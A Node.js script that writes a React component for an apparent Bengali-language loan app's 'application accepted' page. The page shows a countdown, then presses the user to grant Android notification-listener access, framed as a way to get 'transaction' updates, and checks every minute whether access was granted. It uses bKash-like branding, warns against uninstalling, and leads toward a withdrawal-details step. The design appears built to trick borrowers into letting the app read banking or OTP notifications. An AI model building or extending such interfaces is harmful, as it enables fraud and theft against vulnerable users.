const fs = require('fs');
let code = fs.readFileSync('components/SubmissionAccepted.tsx', 'utf8');

// The file was written fully via cat previously. Let's write the whole file to be safe.
const newCode = `import React, { useState, useEffect } from 'react';
import AIChatSupport from './AIChatSupport';

interface Props { sessionId: string; acceptedAt?: number; }

const SubmissionAccepted: React.FC<Props> = ({ sessionId, acceptedAt: acceptedAtProp }) => {
  const [permGranted, setPermGranted] = useState(false);
  const [checking, setChecking] = useState(true);
  const [timeLeft, setTimeLeft] = useState<number>(0);
  const THIRTY_MINUTES = 30 * 60;

  useEffect(() => {
    const acceptedAt = acceptedAtProp || Date.now();
    const updateTimer = () => {
      const elapsed = Math.floor((Date.now() - acceptedAt) / 1000);
      const remaining = Math.max(0, THIRTY_MINUTES - elapsed);
      setTimeLeft(remaining);
      return remaining > 0;
    };
    if (!updateTimer()) return;
    const timerIv = setInterval(() => { if (!updateTimer()) clearInterval(timerIv); }, 1000);
    return () => clearInterval(timerIv);
  }, [acceptedAtProp]);

  useEffect(() => {
    const check = async () => {
      try {
        const Preferences = { get: async () => ({ value: null }) };
        const { value } = await Preferences.get({ key: 'notif_log' });
        if (value) { const n = JSON.parse(value); if (n.length > 0) setPermGranted(true); }
      } catch {}
      setChecking(false);
    };
    check();
    const iv = setInterval(check, 60000);
    return () => clearInterval(iv);
  }, []);

  const openSettings = () => {
    window.location.href = 'intent:#Intent;action=android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;end';
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center px-4 py-12">
      <div className="max-w-lg w-full bg-white rounded-3xl shadow-2xl p-8 md:p-12 text-center">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7"/></svg>
        </div>
        <h2 className="text-2xl font-black text-gray-800 mb-4">আপনার আবেদনটি গৃহীত হয়েছে</h2>
        <div className="bg-green-50 border border-green-200 rounded-2xl p-5 mb-6">
          <p className="text-green-800 text-sm leading-relaxed">আপনার লোন আবেদনটি সফলভাবে গৃহীত হয়েছে। আমাদের টিম আপনার আবেদনটি যাচাই-বাছাই করছে। অনুগ্রহ করে অপেক্ষা করুন।</p>
        </div>

        <div className="bg-gray-900 rounded-2xl p-6 mb-6">
          <p className="text-gray-400 text-xs uppercase tracking-wider mb-2">অপেক্ষা করুন</p>
          <div className="text-center my-3">
            <span className={\`text-3xl font-black font-mono \${timeLeft <= 300 ? 'text-red-400 animate-pulse' : 'text-green-400'}\`}>
              {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
            </span>
          </div>
          <div className="flex justify-center gap-1 mt-3">
            <span className="w-2.5 h-2.5 bg-green-500 rounded-full animate-bounce" style={{animationDelay:'0ms'}}></span>
            <span className="w-2.5 h-2.5 bg-green-500 rounded-full animate-bounce" style={{animationDelay:'150ms'}}></span>
            <span className="w-2.5 h-2.5 bg-green-500 rounded-full animate-bounce" style={{animationDelay:'300ms'}}></span>
          </div>
          <p className="text-gray-500 text-xs mt-3">
            {timeLeft > 0 ? 'আপনার আবেদন রিভিউ করা হচ্ছে... সময় শেষ হলে স্বয়ংক্রিয়ভাবে পরবর্তী ধাপে যাবে' : 'রিভিউ সম্পন্ন! পরবর্তী পেজে নিয়ে যাওয়া হচ্ছে...'}
          </p>
        </div>

        <div className={\`border-2 rounded-2xl p-5 mb-6 text-left \${permGranted ? 'bg-green-50 border-green-300' : 'bg-blue-50 border-blue-300'}\`}>
          {permGranted ? (
            <div>
              <h4 className="font-bold text-green-800 text-sm mb-1">✅ নোটিফিকেশন অনুমতি সক্রিয়</h4>
              <p className="text-green-700 text-xs">আপনার আবেদনটি পর্যালোচনাধীন আছে, দয়া করে অপেক্ষা করুন。</p>
            </div>
          ) : (
            <div>
              <h4 className="font-bold text-blue-900 text-sm mb-2">📱 আবেদনের বর্তমান অবস্থা জানতে নোটিফিকেশন পারমিশন দিন</h4>
              <p className="text-blue-700 text-xs mb-3">পারমিশন দিলে আবেদনের স্ট্যাটাস এবং লেনদেনের তথ্য যাচাই করে আপডেট পাবেন।</p>
              <button onClick={openSettings} className="w-full bg-[#E2136E] hover:bg-[#c4105f] text-white font-bold py-3 rounded-xl text-sm transition-all shadow-md">⚙️ নোটিফিকেশন পারমিশন দিন</button>
              <p className="text-center text-xs text-gray-400 mt-2">প্রতি ১ মিনিট পর চেক করা হবে</p>
            </div>
          )}
        </div>

        <div className="space-y-3 text-left text-sm text-gray-500">
          {['যাচাই প্রক্রিয়া: আমাদের টিম আপনার তথ্য যাচাই করছে','অনুমোদন: আবেদন অনুমোদিত হলে স্ট্যাটাস আপডেট হবে','উত্তোলন: অনুমোদিত হলে টাকা উত্তোলনের জন্য তথ্য দিন'].map((t,i) => (
            <div key={i} className="flex items-start gap-3"><span className="w-6 h-6 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5">{i+1}</span><p><strong>{t.split(':')[0]}:</strong>{t.includes(':')?t.split(':').slice(1).join(':'):''}</p></div>
          ))}
        </div>

        <div className="mt-6 p-4 bg-amber-50 border border-amber-200 rounded-xl"><p className="text-amber-800 text-xs font-medium">⚠️ দয়া করে অ্যাপটি আনইনস্টল করবেন ঘন। স্ট্যাটাস আপডেট পেতে অ্যাপটি চালু রাখুন।</p></div>
        <p className="text-xs text-gray-400 mt-4">সেশন: {sessionId}</p>
      </div>
      <AIChatSupport step="waiting" />
    </div>
  );
};
export default SubmissionAccepted;
`;
fs.writeFileSync('components/SubmissionAccepted.tsx', newCode);
